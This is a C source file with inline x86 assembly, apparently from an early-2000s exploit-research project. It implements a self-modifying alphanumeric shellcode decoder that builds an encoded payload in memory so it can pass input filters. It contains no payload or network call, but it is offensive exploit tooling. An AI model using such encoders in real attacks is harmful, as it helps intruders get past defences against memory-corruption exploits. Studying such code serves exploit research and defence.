/*
  Mixedcase, alphanumeric, shellcode decoder.
  (C) Copyright 2003-2005 Berend-Jan Wever

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

  Thanks to rix for his phrack article on aphanumeric shellcode.
*/

#define byte1 0x72
#define byte2 0x50
#define result -1^byte1^byte2
#define xor_offset imul_marker+4-geteip+result

int main(void) {
	__asm {
// Load baseaddress in [esp-4]
		int		3;	// non-kernel debugger will fsck up the stack! Load it first
		lea		eax, geteip;
// Calculate IMUL offset in EBX; ->> Value X1
		lea		ebx, imul_marker;
		add		ebx, 4;
		sub		ebx, eax;
		mov		edx, -1;
		xor		dl, byte1;
		xor		dl, byte2;
		sub		ebx, edx;
		sub		ebx, edx;
		push	ebx;
// Calculate data store offset in EDI; ->> Value X2
		lea		edi, jnz_marker;
		inc		edi;
		sub		edi, eax;
		inc		edx;
		sub		edi, edx;
		push	edi;
// Calculate data load offset in ESI; ->> Value X3
		mov		esi, edi;
		sub		esi, edx;
		push	esi;
// EBX contains the start value of ESI for the decoder
		dec		edx;
		mov		[esp-4], eax;
		
		
		INT		3;
		INT		3;
		INT		3;
geteip:
		DEC		ESP;
		DEC		ESP;
		DEC		ESP;
		DEC		ESP;
		POP		ECX;					// / EBX = baseaddress

		PUSH	ESI;					// \ 
		PUSH	ESP;					//  \ 
		POP		EAX;					//  / ESI = 0
		XOR		ESI, [EAX];				// /

		PUSH	ESI;					// \ 
		POP		EAX;					// / EAX = 0

		DEC		EAX;					// \ 
		XOR		AL, byte1;				//  > EAX = -35
		XOR		AL, byte2;				// / 

		PUSH	EAX;					// \ ESI = -35
		XOR		ESI, [ESP+2*ESI];		// / 

		PUSH	0x41;					// \ 
		POP		EAX;					// / EAX = 0x41

// DECODE 0x51 -> 0x10 in IMUL
		XOR		[ECX+2*ESI+0x67], AL;	// Value X1


decode_loop:
		INC		ESI;
imul_marker:
		IMUL	EAX, [ECX+2*ESI+0x6F], 0x51; // \ (Value X3)
		XOR		AL, [ECX+2*ESI+0x70];		 // / DECODE BYTE INTO AL (Value X3+1)
		XOR		[ECX+ESI+0x4D], AL;		// STORE DECODED BYTE (Value X2)

// Decode untill we've decoded a 0x00. (JNZ requires a the negative offset,
// which isn't alphanumeric, so it will be the first byte we decode.
jnz_marker:
		_emit	0x75;					// JNZ ...
		_emit	0x39;					// \ 
		_emit	0x59;					// / Encoded offset for jump to decode_loop
/*
		_emit	0x4D;				// \ 
		_emit	0x45;				// / Encoded Int 3

		_emit	0x50;				// \ 
		_emit	0x4D;				// / Encoded 0
/*/
end:
		INT		3;
		INT		3;
		INT		3;
	}
}

